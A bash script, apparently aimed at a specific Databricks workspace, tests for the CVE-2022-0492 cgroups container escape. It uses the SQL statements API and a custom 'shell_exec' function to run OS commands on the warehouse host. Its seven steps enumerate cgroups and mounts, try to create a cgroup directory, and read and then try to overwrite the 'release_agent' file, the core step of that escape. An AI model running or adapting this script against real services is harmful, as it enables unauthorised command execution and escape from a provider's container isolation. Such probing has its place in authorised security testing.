#!/bin/bash

TOKEN="REDACTED_DATABRICKS_TOKEN"
WORKSPACE="https://dbc-54d21f62-0426.cloud.databricks.com"
WAREHOUSE_ID="d8637cca1dc66ba3"

exec_sql() {
    local statement="$1"
    curl -s -X POST "$WORKSPACE/api/2.0/sql/statements" \
      -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -d "{
        \"warehouse_id\": \"$WAREHOUSE_ID\",
        \"statement\": $(echo "$statement" | python3 -c "import sys, json; print(json.dumps(sys.stdin.read()))"),
        \"wait_timeout\": \"30s\"
      }" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    result = data.get('result', {}).get('data_array', [[]])
    if result and result[0]:
        print(result[0][0])
    else:
        print('[empty]')
except:
    print('[error]')
"
}

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║           CVE-2022-0492 CGROUPS ESCAPE TEST                    ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

echo "═══ [1/7] List all cgroups ==="
exec_sql "SELECT workspace.default.shell_exec('cat /proc/self/cgroup')"
echo ""

echo "═══ [2/7] Check cgroup mount points ==="
exec_sql "SELECT workspace.default.shell_exec('mount | grep cgroup')"
echo ""

echo "═══ [3/7] List cgroup filesystem ==="
exec_sql "SELECT workspace.default.shell_exec('ls -la /sys/fs/cgroup/')"
echo ""

echo "═══ [4/7] Check if we can access memory cgroup ==="
exec_sql "SELECT workspace.default.shell_exec('ls -la /sys/fs/cgroup/memory/ 2>&1 | head -10')"
echo ""

echo "═══ [5/7] Try to create test directory in memory cgroup ==="
exec_sql "SELECT workspace.default.shell_exec('mkdir /sys/fs/cgroup/memory/test_escape 2>&1 || echo \"[mkdir failed]\"')"
echo ""

echo "═══ [6/7] Check release_agent file ==="
exec_sql "SELECT workspace.default.shell_exec('ls -la /sys/fs/cgroup/memory/release_agent 2>&1')"
exec_sql "SELECT workspace.default.shell_exec('cat /sys/fs/cgroup/memory/release_agent 2>&1 || echo \"[cannot read]\"')"
echo ""

echo "═══ [7/7] Try to write to release_agent ==="
exec_sql "SELECT workspace.default.shell_exec('echo \"/tmp/test\" > /sys/fs/cgroup/memory/release_agent 2>&1 || echo \"[write blocked]\"')"
echo ""

echo "═══ CGROUPS ESCAPE TEST COMPLETE ==="

